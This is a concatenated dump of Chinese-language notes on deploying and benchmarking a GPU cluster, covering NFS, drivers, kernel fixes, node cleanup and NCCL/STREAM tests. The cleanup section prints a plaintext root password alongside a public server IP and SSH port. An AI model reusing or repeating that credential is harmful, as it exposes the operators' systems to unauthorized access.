+注意：如果是新增节点要挂载，需要先将新增节点补充到/etc/exports里面，再执行exportfs -ra (重新加载配置)刷新下配置)。
+然后到在服务端批量执行for i in `cat hostlist-new`;do ssh $i &quot;mount 172.16.10.11:/ssd/run /root/run&quot;;done
+这里的172.16.10.11是服务端IP
+客户端挂载：
+#!/bin/bash
+apt -y install nfs-common
+mkdir -p /data/apps
+mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.31.17.2:/ssd/apps /data/apps
+#echo &quot;mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.31.17.2:/ssd/apps /data/apps&quot; >> /etc/rc.local
+Noresvport 存在的目的是为了可以避免网络闪断导致 nfs hang 住，请注意，如果后面有了Noresvport前面也需要有insecure存在，否则会出现权限问题。
+sudo-t nfs -o
+挂载将NFS协议的网络文件系统以硬盘形式挂载
+vers=
+NFS客户端版本
+proto=tcp
+以TCP网络形式连接，相较于UDP更可靠
+rsize=1048576
+在NFS服务器读取文件时NFS使用的字节数，默认值是1024个字节，最大1048576字节， 该值越大，向服务器发送的请求包越少，性能越高。
+wsize=1048576
+向NFS服务器写文件时NFS使用的字节数 默认值是1024个字节，最大1048576字节，该值越大，向服务器发送的请求包越少，性能越高。
+hard
+使用硬挂载的方式挂载系统 ，重复请求直到NFS服务器回应。；适用于不希望业务由于网络延迟或服务器服务重启或短暂的过载等情况而中断场景
+timeo=600
+对于基于TCP的NFS服务，默认等待重传时间为60s ，数据越大，持续重传的时间越长，可减少数据传输失败概率。
+retrans=2
+客户端返回错误前的重传次数。默认为重传3次。
+noresvport
+该参数将在后端NFS失效情况下进行持续性重连，适用于联通云服务高可用场景
+mount_path
+文件系统提供的挂载点，为在文件存储控制台-文件系统列表/相应文件系统详情页面中获取挂载点信息，某些场景下使用根目录进行挂载可能存在问题，可以于“mount_path”后添加“/share”路径进行挂载。
+/mnt
+将文件系统挂载的目录
+智谱批量执行示例：
+pdsh -R ssh -w g[0001-0046] &quot;sudo sh -c 'echo sudo mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.254.27.100:/volume1/data /nas1 >> /etc/fstab'&quot;
+pdsh -R ssh -w g[0001-0046] &quot;sudo sh -c 'echo sudo mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.254.27.101:/volume1/data /nas2 >> /etc/fstab'&quot;
+如果出现这个报错：Mount failed with mount: mount.nfs: access denied by server while mounting error
+可能有以下原因：
+1、/etc/exports 里面insecure 和 rc.local里面mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.31.17.2:/ssd/apps /data/apps 没有成对出现，如果是因为这个原因，可以把2者都取消，或者都写上，增减参数后，记得执行exportfs -ra，再systemctl restart rc-local.service 以及systemctl status rc-local.service，如果不奏效，直接mount -t nfs -o vers=3,nolock,proto=tcp,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2 10.31.17.2:/ssd/apps /data/apps
+2、还有一个原因就是，看10.31.17.2:/ssd/apps /data/apps 里面，目录顺序是否弄反了。
+批量执行：
+for i in cat hostlist ; do scp mountnfs.sh $i:~/ ;done
+for i in cat hostlist ; do (  ssh $i  &quot;sudo ~/mountnfs.sh&quot; &);done
+7、同步/etc/hosts
+for i in `cat hostlist` ; do ( ssh $i &quot;sudo /data/apps/conf/synchosts.sh&quot; & );done
+8、配置rc.local
+将rc.local 放到共享目录下面路径 /data/apps/conf/rc.local
+#!/bin/bash
+echo &quot;&quot; >> /lib/systemd/system/rc-local.service
+echo &quot;[Install]&quot; >> /lib/systemd/system/rc-local.service
+echo &quot;WantedBy=multi-user.target&quot; >> /lib/systemd/system/rc-local.service
+#echo -e '#!/bin/bash\n' | cat - /etc/rc.local > temp && mv temp /etc/rc.local
+cp /data/apps/conf/rc.local /etc/rc.local
+chmod 755 /etc/rc.local
+systemctl daemon-reload
+systemctl restart rc-local.service  #如果是用到IB网络，需要注意
+systemctl enable rc-local.service
+systemctl status rc-local.service
+批量执行
+for i in `cat hostlist` ; do ssh $i &quot;sudo /data/apps/conf/rclocal.sh&quot; ;done
+更新rc.local 
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/conf/syncrclocal.sh&quot; & ) ;done
+9、关闭内核更新并检查内核版本
+uname -a
+如果和其它机器不一致，同步为一致的内核版本。
+for i in `cat hostlist` ; do ssh $i  &quot;uname -a&quot; ;done
+升级内核到指定版本：
+升级内核前注意删除nvidia驱动和IB驱动。
+apt-get upgrade linux-image-5.15.0-76-generic
+升级内核重启后如果出现无法进入系统，卡在（initramfs） 提示UUID  xxx does not exist
+进入单用户模式或者救援模式，挂上盘这里/dev/sda3是/ /dev/sda2是/boot
+sudo mount /dev/sda3 /mnt
+sudo mount /dev/sda2 /mnt/boot
+sudo mount --bind /dev /mnt/dev
+sudo mount --bind /sys /mnt/sys
+sudo mount --bind /proc /mnt/proc
+sudo chroot /mnt
+修复grub bootloader
+grub-mkconfig
+update-grub
+更新initramdisk
+update-initramfs -k 5.15.0-76-generic -u
+10.关闭自动更新
+for i in cat hostlist ; do ( ssh $i &quot; sudo /data/apps/conf/disableupdate.sh&quot; & ) ;done
+11.ssh配置
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/conf/ssh.sh&quot; & );done
+12、安装必要的包
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/conf/installpackage.sh&quot; & );done
+升级内核后以前装的依赖包都用不了了需要reinstall重新安装一遍，要不然安装ib驱动会提示缺少依赖
+apt-get install environment-modules 这个需要module时，需要安装。如果是centos 则执行yum install environment-modules
+将modulefiles路径加到/usr/share/modules/init/.modulespath (for ubuntu)
+/usr/share/Modules/init/.modulespath (for centos7.9)
+最后source /usr/share/modules/init/profile.sh （for ubuntu）
+source /usr/share/Modules/init/bash_completion (for centos)
+13、禁用nouveau
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/disblenouveau.sh&quot; & );done
+14、安装IB驱动
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/conf/installofed.sh&quot; & );done
+下载方式参考链接： HYPERLINK &quot;https://enterprise-support.nvidia.com/s/article/howto-install-mlnx-ofed-driver#:~:text=Get%20the%20MLNX_OFED%20version%20from,%2D.tgz%20.&quot; https://enterprise-support.nvidia.com/s/article/howto-install-mlnx-ofed-driver#:~:text=Get%20the%20MLNX_OFED%20version%20from,%2D.tgz%20.比如：MLNX_OFED_LINUX-24.04-0.7.0.0-ubuntu22.04-x86_64.tgz下载方式：wget http://www.mellanox.com/downloads/ofed/MLNX_OFED-24.04-0.7.0.0/MLNX_OFED_LINUX-24.04-0.7.0.0-ubuntu22.04-x86_64.tgz
+15、安装nvidia 驱动
+for i in cat hostlist ; do ( ssh $i &quot;sudo /data/apps/installnvidiadriver.sh&quot; & );done
+新机器一键安装
+先执行install_all_1.sh
+重启reboot
+再执行install_all_2.sh
+openmpi安装遇到报错
+WARNING: 'automake-1.15' is missing on your system. You should only need it if you modified 'Makefile.am' or 'configure.ac' or m4 files included by 'configure.ac'. The 'automake' program is part of the GNU Automake package: <http://www.gnu.org/software/automake> It also requires GNU Autoconf, GNU m4 and Perl in order to run: <http://www.gnu.org/software/autoconf> <http://www.gnu.org/software/m4/> <http://www.perl.org/> make: *** [Makefile.in] Error 1
+解决办法：先autoreconf -fiv，然后再configure
+参考链接： HYPERLINK &quot;https://cloud.tencent.com/developer/ask/sof/106454349/answer/105971431&quot; https://cloud.tencent.com/developer/ask/sof/106454349/answer/105971431
+Option package-version requires an argument
+Usage: ../../../config/make_manpage.pl --package-name=<package name> --package-version=<package version> --ompi-date=<ompi date> --opal-date=<opal date> --orte-date=<orte date> --input=<input file> --output=<output file> [--nocxx] [ --nofortran] [--nof08]
+make[2]: *** [opal_crs.7] Error 1
+make[2]: *** Waiting for unfinished jobs....
+make[2]: Leaving directory `/mnt/nfs/zhou/openmpi-4.1.5/opal/mca/crs'
+make[1]: *** [all-recursive] Error 1
+make[1]: Leaving directory `/mnt/nfs/zhou/openmpi-4.1.5/opal'
+make: *** [all-recursive] Error 1
+解决办法：在configure里面第593和594行添加版本号
+参考链接： HYPERLINK &quot;https://blog.csdn.net/weixin_40501169/article/details/119347380&quot; https://blog.csdn.net/weixin_40501169/article/details/119347380
+集群清理复用步骤
+1、彻底删除共享目录及其家目录下面的原始数据，部署的软件除外
+删除conda虚拟环境
+history -c #删除history记录
+3.1、执行ls -al，查看隐藏文件及目录，删掉除.ssh外的所有隐藏文件和目录，
+执行以下命令：
+删除隐藏文件夹: find . -maxdepth 1 -type d -name &quot;.*&quot; ! -name &quot;.ssh&quot; -exec rm -rf {} \;
+删除隐藏文件: find . -maxdepth 1 -type f -name &quot;.*&quot; ! -name &quot;.ssh&quot; -exec rm -rf {} \;
+cp /etc/skel/.* .  
+修改密码
+执行apt-get install pwgen来安装自动密码生成器
+pwgen -cy -1 -n 15 16 密码位数较长
+选择新密码：ij2gooDe^y
+在g0278上依次执行下列命令：
+sudo passwd ubuntu  #修改乌班图密码，然后输入新密码
+sudo passwd #修改root密码，跟乌班图密码保持一致
+接下来ssh g0284上
+sudo passwd ubuntu  #修改乌班图密码，然后输入新密码，同g0278
+sudo passwd #修改root密码，跟乌班图密码保持一致，同g0278
+注意：如果有个节点/etc/ssh/sshd_config里面禁止密码登录，那么需要在拷贝.ssh前将文件里面的PasswordAuthentication no 改为PasswordAuthentication yes，然后执行service ssh restart 重启ssh服务，使之生效，再进行密钥拷贝操作（免密操作），拷贝完成后，再修改sshd_config，改回来，再重启ssh服务，就可以了
+参考链接：https://blog.csdn.net/qq_32506245/article/details/81355497
+5、重置密钥
+ssh-keygen
+问是否选择覆盖，选y
+接下来就是默认回车即可
+cp id_rsa.pub authorized_keys
+scp -r ~/.ssh g0284:~
+6、验证
+ssh g0284 可以很顺利跳转过去
+7、在N37分区如何换新密钥
+例如：我需要将g0010的新秘钥给批量拷贝到其他节点上去，可以先把其他节点的旧密钥拷贝到g0010家目录下，然后执行：
+scp -i id_rsa -rp ~/.ssh 172.16.13.24:/root
+前提是/etc/hosts里面有这个节点内网IP和节点名，否则会报没有这个hostname
+8、在37分区如何通过公网传输文件
+scp -P 52014 -i id_rsa NVIDIA-Linux-x86_64-535.129.03.run  HYPERLINK &quot;mailto:root@175.102.135.162:/data/apps&quot; root@175.102.135.162:/data/apps
+那是否可以通过内网传输呢？
+例如：动物所机器对应的公网IP和哈工大的公网IP不是同一个，意味着他们的VPC不一样，故内网也不通，不能通过内网传输文件
+9、降低内核版本方式
+sudo  vim /etc/default/grub
+修改 GRUB_DEFAULT=&quot;1> 2&quot;
+sudo  update-grub
+解决waiting for cache lock: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 99415 (apt)... 12s问题
+参考链接： HYPERLINK &quot;https://www.zhihu.com/question/590708259&quot; https://www.zhihu.com/question/590708259
+1、删除apt进程
+ps aux | grep -i apt
+2、删除锁文件
+rm /var/lib/apt/lists/lock
+rm /var/lib/dpkg/lock-frontend
+rm /var/cache/apt/archives/lock
+rm /var/lib/dpkg/lock
+3、解决centos安装驱动的报错问题，报错如下：
+ERROR: Unable to find the kernel source tree for the currently running kernel.  Please make sure you have installed the kernel source files for your kernel and that they are properly configured; on Red Hat Linux systems, for example, be sure you have the 'kernel-source' or 'kernel-devel' RPM installed.  If you know the correct kernel source files are installed, you may specify the kernel source path with the '--kernel-source-path' command line option.
+===== /root/conf/~$untu闆嗙兢閮ㄧ讲.docx (162B)
+===== /root/conf/闆嗙兢鍩虹鏁版嵁娴嬭瘯.docx (549012B)
+集群基础数据测试
+stream测试（内存带宽测试）
+链接：HYPERLINK https://blog.csdn.net/v6543210/article/details/121608705 normalLink \tdkey f3bps4 \tdfe -10 \tdfn STREAM%u5185%u5B58%u5E26%u5BBD%u6D4B%u8BD5%u5DE5%u5177%u4ECB%u7ECD%u53CA%u5176%u5185%u90E8%u5B9E%u73B0_stream%u6D4B%u8BD5_%u8DEF%u8FB9%u95F2%u4EBA2%u7684%u535A%u5BA2-CSDN%u535A%u5BA2 \tdfu https://blog.csdn.net/v6543210/article/details/121608705 \tdlf FromPaste \tdlt text STREAM内存带宽测试工具介绍及其内部实现_stream测试_路边闲人2的博客-CSDN博客
+安装参考上面
+gcc -O3 -fopenmp -DSTREAM_ARRAY_SIZE=2000000 stream.c -o stream.2M
+gcc -O3 -fopenmp -DSTREAM_ARRAY_SIZE=20000000 stream.c -o stream.20M (推荐)
+#risc-v platform 
+gcc -O3 -fopenmp -DSTREAM_ARRAY_SIZE=80000000 stream.c -o stream.80M -mexplicit-relocs
+1.    –fopenmp
+适应多处理器环境。开启后，程序默认线程为CPU线程数，也可以运行时也可以动态指定运行的进程数，12为自定义的要使用的处理器数。
+export OMP_NUM_THREADS=12 
+2.    -DSTREAM_ARRAY_SIZE
+计算方法参考stream.c中的说明，举例：u540的 L2缓存 2MB，其值为 
+double类型占8 Byte，每个ARRAY的大小是 STREAM_ARRAY_SIZE * 8Byte。
+每个ARRAY的大小要超过4倍的缓存大小，即：
+        STREAM_ARRAY_SIZE * 8B   >   4 * 2MB
+可得STREAM_ARRAY_SIZE最小需要为1M，在这里作者并不区分1M是10的6次方，还是2的20次方，因为4倍大小已经远远大于缓存，能够保证访存到达内存而不是访问到缓存。这个值是最小值，可以适当大于此值，增大array size会增加测试时间，也会保证测试过程至少经历20个clock ticks。
+下面是代码中关于STREAM_ARRAY_SIZE的说明：
+ *    1) STREAM requires different amounts of memory to run on different
+ *           systems, depending on both the system cache size(s) and the
+ *           granularity of the system timer.
+ *     You should adjust the value of 'STREAM_ARRAY_SIZE' (below)
+ *           to meet *both* of the following criteria:
+ *       (a) Each array must be at least 4 times the size of the
+ *           available cache memory. I don't worry about the difference
+ *           between 10^6 and 2^20, so in practice the minimum array size
+ *           is about 3.8 times the cache size.
+ *           Example 1: One Xeon E3 with 8 MB L3 cache
+ *               STREAM_ARRAY_SIZE should be >= 4 million, giving
+ *               an array size of 30.5 MB and a total memory requirement
+ *               of 91.5 MB.  
+ *           Example 2: Two Xeon E5's with 20 MB L3 cache each (using OpenMP)
+ *               STREAM_ARRAY_SIZE should be >= 20 million, giving
+ *               an array size of 153 MB and a total memory requirement
+ *               of 458 MB.  
+ *       (b) The size should be large enough so that the 'timing calibration'
+ *           output by the program is at least 20 clock-ticks.  
+ *           Example: most versions of Windows have a 10 millisecond timer
+ *               granularity.  20 &quot;ticks&quot; at 10 ms/tic is 200 milliseconds.
+ *               If the chip is capable of 10 GB/s, it moves 2 GB in 200 msec.
+ *              This means the each array must be at least 1 GB, or 128M elements.
+3.    –DNTIMES
+NTIMES是执行次数，默认值是10，所有测试，结束后从结果中取最优，第一轮测试的结果不参与最终统计。
+4.    -mexplicit-relocs 
+当STREAM_ARRAY_SIZE太大时，gcc编译会出错，需要使用此选项更改代码链接时的分布。
+p2p测试
+下载软件：wget HYPERLINK https://github.com/NVIDIA/cuda-samples/archive/refs/tags/v11.8.tar.gz normalLink \tdkey cqf40u \tdfe -10 \tdfn https%3A//github.com/NVIDIA/cuda-samples/archive/refs/tags/v11.8.tar.gz \tdfu https://github.com/NVIDIA/cuda-samples/archive/refs/tags/v11.8.tar.gz \tdlt text https://github.com/NVIDIA/cuda-samples/archive/refs/tags/v11.8.tar.gz
+编译：
+make TARGET_ARCH=x86_64  SMS=&quot;80&quot;
+如果报找不到freeimage.h文件，按如下步骤解决
+wget http://downloads.sourceforge.net/freeimage/FreeImage3170.zip
+unzip FreeImage3170.zip
+make && make install
+或者到bandtest下面，修改/root/zhou/packages/bandtest/samples/z/p2pBandwidthLatencyTest/Makefile里面的第37行：37 CUDA_PATH ?= &quot;/usr/local/cuda&quot;，写正确即可执行make编译。
+如果报找不到头文件，p2pBandwidthLatencyTest.cu:15:25: fatal error: helper_cuda.h: No such file or directory
+可以到Makefile里面，修改245行为 INCLUDES  := -I /data/package/data/apps/cuda/10.0/samples/common/inc
+gpuburn测试
+下载地址：HYPERLINK https://github.com/wilicc/gpu-burn normalLink \tdkey 1bjadq \tdfe -10 \tdfn GitHub%20-%20wilicc/gpu-burn%3A%20Multi-GPU%20CUDA%20stress%20test \tdfu https://github.com/wilicc/gpu-burn \tdlf FromPaste \tdlt text GitHub - wilicc/gpu-burn: Multi-GPU CUDA stress test
+make CCPATH=/usr/local/bin CUDAPATH=/usr/local/cuda
+测试
+./gpu_burn -d 3600 
+-d表示测试双精度
+./gpu_burn 500 #测试卡单精度性能
+./gpu_burn -tc 500 #测试tensor core性能
+郑州V100-SXM2-16G
+                                                                                                                                                   RTX 3090
+      12分区
+V100-SXM2-16G
+N32-E
+A100-40G PCIE
+A100-80G nvlink
+双精度
+6611 Gflop/s
+552 Gflop/s
+6059 Gflop/s
+14502 Gflop/s
+16868 Gflop/s
+单精度
+13856  Gflop/s
+18506 Gflop/s
+13424 Gflop/s
+16314 Gflop/s
+17405 Gflop/s
+tensor core
+52764 Gflop/s
+---
+49612 Gflop/s
+81923 Gflop/s
+94583 Gflop/s
+nccl-test：
+配置yum网络源：HYPERLINK https://blog.csdn.net/qq_46162321/article/details/115006096 normalLink \tdkey qhdryn \tdfe -10 \tdfn Centos7%u914D%u7F6Eyum%u6E90%uFF08%u672C%u5730yum%u6E90%u548C%u963F%u91CC%u7F51%u7EDCyum%u6E90%uFF09_centos7yum%u6E90%u914D%u7F6E_%u8DD1%u4E0D%u5B8C%u7684%u811A%u672C%u7684%u535A%u5BA2-CSDN%u535A%u5BA2 \tdfu https://blog.csdn.net/qq_46162321/article/details/115006096 \tdlf FromPaste \tdlt text Centos7配置yum源（本地yum源和阿里网络yum源）_centos7yum源配置_跑不完的脚本的博客-CSDN博客
+HYPERLINK https://blog.csdn.net/qq_26129413/article/details/110402238 normalLink \tdkey 1zk0wa \tdfe -10 \tdfn %u83B7%u53D6YUM%u6E90%u7684%u4E09%u79CD%u65B9%u6CD5%uFF0C%u4E00%u7BC7%u5C31%u591F_%u67E5%u770B%u5F53%u524Dyum%u6E90_king%20config%u7684%u535A%u5BA2-CSDN%u535A%u5BA2 \tdfu https://blog.csdn.net/qq_26129413/article/details/110402238 \tdlf FromPaste \tdlt text 获取YUM源的三种方法，一篇就够_查看当前yum源_king config的博客-CSDN博客
+显示GID
+show_gids 
+DEVPORTINDEXGIDIPv4  VERDEV
+---------------------------  ------
+mlx5_010fe80:0000:0000:0000:b83f:d203:0051:e7dcv1
+mlx5_110fe80:0000:0000:0000:b83f:d203:0051:e814v1
+n_gids_found=2
+nccl编译：
+make -j 4 src.build NVCC_GENCODE=&quot;-gencode=arch=compute_70,code=sm_70&quot;  CUDA_HOME=/data/apps/cuda
+nccl-tests编译：
+make MPI=1 MPI_HOME=/data/apps/openmpi CUDA_HOME=/data/apps/cuda NCCL_HOME=/data/package/nccl-master/build
+跑单节点all_reduce_per
+./all_reduce_perf -b 8 -e 1G -f 2 -g 8   #1G这里可以设置成其他的块大小，比如256M
+跑多节点all_reduce_per
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_3:1,mlx5_4:1,mlx5_5:1 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring -H /root/run/apps/conf/hostlist21-30 --allow-run-as-root --mca btl ^tcp all_reduce_perf -b 8 -e 1G -f 2 -g 8
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_3:1,mlx5_4:1,mlx5_5:1 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring -H /root/run/apps/conf/hostlist21-30 --allow-run-as-root --mca btl ^tcp all_reduce_perf -b 8 -e 1G -f 2 -g 8
+在slurm集群跑示例
+#!/bin/bash
+export PATH=/ssd/apps/openmpi-4.1.2/install/bin:/ssd/apps/nccl-tests-master/build:$PATH
+export LD_LIBRARY_PATH=/ssd/apps/openmpi-4.1.2/install/lib:$LD_LIBRARY_PATH
+export LD_LIBRARY_PATH=/ssd/apps/nccl/build/lib:$LD_LIBRARY_PATH
+export NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_4:1,mlx5_5:1
+export NCCL_IB_DISABLE=0
+export NCCL_SOCKET_IFNAME=bond0
+cat /dev/null > hostfile
+for host in $(scontrol show hostnames); do
+        MPI_HOSTS=&quot;${host} slots=8&quot;
+        echo -e &quot;$MPI_HOSTS&quot; >> hostfile
+done
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_4:1,mlx5_5:1 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring --mca btl ^tcp --hostfile hostfile all_reduce_perf b 8 -e 8G -f 2 -g 1
+#!/bin/bash
+export PATH=/ssd/apps/openmpi-4.1.2/install/bin:/ssd/apps/nccl-tests-master/build:$PATH
+export LD_LIBRARY_PATH=/ssd/apps/openmpi-4.1.2/install/lib:$LD_LIBRARY_PATH
+export LD_LIBRARY_PATH=/ssd/apps/nccl/build/lib:$LD_LIBRARY_PATH
+export NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_4:1,mlx5_5:1
+export NCCL_IB_DISABLE=0
+export NCCL_SOCKET_IFNAME=bond0
+cat /dev/null > hostfile
+for host in $(scontrol show hostnames); do
+        MPI_HOSTS=&quot;${host} slots=8&quot;
+        echo -e &quot;$MPI_HOSTS&quot; >> hostfile
+done
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1,mlx5_1:1,mlx5_4:1,mlx5_5:1 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring --mca btl ^tcp --hostfile hostfile all_reduce_perf b 8 -e 8G -f 2 -g 1
+#这里的NCCL_IB_GID_INDEX 要根据show_gids来设置，如果是2，可以不用设置该命令。
+跑单节点all_gather_per
+./all_gather_perf -b 8 -e 1G -f 2 -g 8
+跑多节点all_gather_per
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1 -x NCCL_IB_DISABLE=0 -x NCCL_IB_GID_INDEX=2 -x NCCL_ALGO=Ring -H A800GPU04,A800GPU05 --allow-run-as-root --mca btl ^tcp all_gather_perf -b 8 -e 1G -f 2 -g 8
+跑单节点reduce_scatter_perf
+./reduce_scatter_perf -b 8 -e 1G -f 2 -g 8
+跑多节点reduce_scatter_perf
+mpirun -x LD_LIBRARY_PATH -x PATH -x NCCL_IB_HCA=mlx5_0:1 -x NCCL_IB_DISABLE=0 -x NCCL_IB_GID_INDEX=2 -x NCCL_ALGO=Ring -H A800GPU04,A800GPU05 --allow-run-as-root --mca btl ^tcp reduce_scatter_perf -b 8 -e 1G -f 2 -g 8
+PS：企业微文档换行 ALT + ENTER
+存储测试：
+安装参考：HYPERLINK https://github.com/breuner/elbencho normalLink \tdkey xteqdj \tdfe -10 \tdfn GitHub%20-%20breuner/elbencho%3A%20A%20distributed%20storage%20benchmark%20for%20file%20systems%2C%20object%20stores%20%26amp%3B%20block%20devices%20with%20support%20for%20GPUs \tdfu https://github.com/breuner/elbencho \tdlf FromPaste \tdlt text GitHub - breuner/elbencho: A distributed storage benchmark for file systems, object stores &amp; block devices with support for GPUs
+yum install boost-devel gcc-c++ git libaio-devel make ncurses-devel numactl-devel rpm-build
+yum install centos-release-scl # for CentOS
+yum install devtoolset-8 
+scl enable devtoolset-8 bash # alternatively: source /opt/rh/devtoolset-8/enable
+再安装elbencho
+git clone https://github.com/breuner/elbencho.git 
+cd elbencho
+make -j $(nproc)
+编译完成后，在各自节点执行elbencho --service 开启服务，否则会报错
+测试命令：
+先mkdir IO.test
+elbencho --hosts  A800GPU11,A800GPU13  --threads 8 --files 1 --size 50G --block 1M --dirsharing --mkdirs --sync --write --read --delfiles --direct ./IO.test
+elbencho --hosts  A800GPU11,A800GPU13  --threads 8 --files 1 --size 50G --block 1M --dirsharing --mkdirs --sync --write --read --delfiles --direct ./IO.test
+里面参数含义可以参考：HYPERLINK https://www.glennklockwood.com/benchmarks/elbencho.html normalLink \tdkey zirl61 \tdfe -10 \tdfn Getting%20Started%20with%20elbencho \tdfu https://www.glennklockwood.com/benchmarks/elbencho.html \tdlf FromPaste \tdlt text Getting Started with elbencho
+在centos下安装openmpi的时候，会遇到以下报错：
+解决方案：1、下载m4包，wget wget HYPERLINK http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz normalLink \tdfe -10 \tdfn http%3A//ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz \tdfu http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz \tdlf FromInput \tdlt text http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz 然后解压，./configure --prefix=/usr && make && make install
+2、rpm -qa|grep autoconf && rpm -qa|grep automake 查看已有的autoconf版本和automake版本，如果autoconf版本达标，则升级automake版本即可。
+3、升级automake版本，wget HYPERLINK https://github.com/autotools-mirror/automake/archive/refs/tags/v1.15.tar.gz normalLink \tdkey 26qy7x \tdfe -10 \tdfn https%3A//github.com/autotools-mirror/automake/archive/refs/tags/v1.15.tar.gz \tdfu https://github.com/autotools-mirror/automake/archive/refs/tags/v1.15.tar.gz \tdlt text https://github.com/autotools-mirror/automake/archive/refs/tags/v1.15.tar.gz
+yum install autoconf && yum groupinstall perl* && yum install texinfo && yum install flex
+再./bootstrap && ./configure --prefix=/usr && make && make install
+集群pdsh使用技巧
+HYPERLINK https://www.cnblogs.com/goldenblade/p/9604642.html normalLink \tdkey 5gipk1 \tdfe -10 \tdfn %u8FD0%u7EF4%u5DE5%u5177pssh%u548Cpdsh%u5B89%u88C5%u548C%u4F7F%u7528%20-%20Robin%u6C49%20-%20%u535A%u5BA2%u56ED \tdfu https://www.cnblogs.com/goldenblade/p/9604642.html \tdlf FromPaste \tdlt text 运维工具pssh和pdsh安装和使用 - Robin汉 - 博客园
+使用方法示例：pdsh -R ssh -w ^hostlist date
+如果不加-R ssh，会报错
+gcc编译：
+1、cd 到gcc source dir 然后执行./contrib/download_prerequisites，这一步是为了下载一些附属模块。
+2、然后在source dir 外新建build目录，在目录里面执行
+../gcc-9.4.0/configure --prefix=/data/apps/gcc --enable-languages=c,c++,objc,obj-c++,fortran --disable-multilib --disable-checking
+3、make -j12 && make install -j12
+===== /root/conf/集群基础数据测试.docx (549012B)
+集群基础数据测试
+stream测试（内存带宽测试）
+链接：HYPERLINK https://blog.csdn.net/v6543210/article/details/121608705 normalLink \tdkey f3bps4 \tdfe -10 \tdfn STREAM%u5185%u5B58%u5E26%u5BBD%u6D4B%u8BD5%u5DE5%u5177%u4ECB%u7ECD%u53CA%u5176%u5185%u90E8%u5B9E%u73B0_stream%u6D4B%u8BD5_%u8DEF%u8FB9%u95F2%u4EBA2%u7684%u535A%u5BA2-CSDN%u535A%u5BA2 \tdfu https://blog.csdn.net/v6543210/article/details/121608705 \tdlf FromPaste \tdlt text STREAM内存带宽测试工具介绍及其内部实现_stream测试_路边闲人2的博客-CSDN博客
+安装参考上面
+gcc -O3 -fopenmp -DSTREAM_ARRAY_SIZE=2000000 stream.c -o stream.2M
+gcc -O3 -fopenmp -DSTREAM_ARRAY_SIZE=20000000 stream.c -o stream.20M (推荐)
+#risc-v platform 
+gcc -O3 -fopenmp -DSTREAM_ARRAY_SIZE=80000000 stream.c -o stream.80M -mexplicit-relocs
+1.    –fopenmp
+适应多处理器环境。开启后，程序默认线程为CPU线程数，也可以运行时也可以动态指定运行的进程数，12为自定义的要使用的处理器数。
+export OMP_NUM_THREADS=12 
+2.    -DSTREAM_ARRAY_SIZE
+计算方法参考stream.c中的说明，举例：u540的 L2缓存 2MB，其值为 
+double类型占8 Byte，每个ARRAY的大小是 STREAM_ARRAY_SIZE * 8Byte。
+每个ARRAY的大小要超过4倍的缓存大小，即：
+        STREAM_ARRAY_SIZE * 8B   >   4 * 2MB
+可得STREAM_ARRAY_SIZE最小需要为1M，在这里作者并不区分1M是10的6次方，还是2的20次方，因为4倍大小已经远远大于缓存，能够保证访存到达内存而不是访问到缓存。这个值是最小值，可以适当大于此值，增大array size会增加测试时间，也会保证测试过程至少经历20个clock ticks。
+下面是代码中关于STREAM_ARRAY_SIZE的说明：
+ *    1) STREAM requires different amounts of memory to run on different
+ *           systems, depending on both the system cache size(s) and the
+ *           granularity of the system timer.
+ *     You should adjust the value of 'STREAM_ARRAY_SIZE' (below)
+ *           to meet *both* of the following criteria:
+ *       (a) Each array must be at least 4 times the size of the
+ *           available cache memory. I don't worry about the difference
+ *           between 10^6 and 2^20, so in practice the minimum array size
+ *           is about 3.8 times the cache size.
+ *           Example 1: One Xeon E3 with 8 MB L3 cache
+ *               STREAM_ARRAY_SIZE should be >= 4 million, giving
+ *               an array size of 30.5 MB and a total memory requirement
+ *               of 91.5 MB.  
+ *           Example 2: Two Xeon E5's with 20 MB L3 cache each (using OpenMP)
+ *               STREAM_ARRAY_SIZE should be >= 20 million, giving
+ *               an array size of 153 MB and a total memory requirement
+ *               of 458 MB.  
+ *       (b) The size should be large enough so that the 'timing calibration'
+ *           output by the program is at least 20 clock-ticks.  
+ *           Example: most versions of Windows have a 10 millisecond timer
+ *               granularity.  20 &quot;ticks&quot; at 10 ms/tic is 200 milliseconds.
+ *               If the chip is capable of 10 GB/s, it moves 2 GB in 200 msec.
+ *              This means the each array must be at least 1 GB, or 128M elements.
+3.    –DNTIMES
+NTIMES是执行次数，默认值是10，所有测试，结束后从结果中取最优，第一轮测试的结果不参与最终统计。
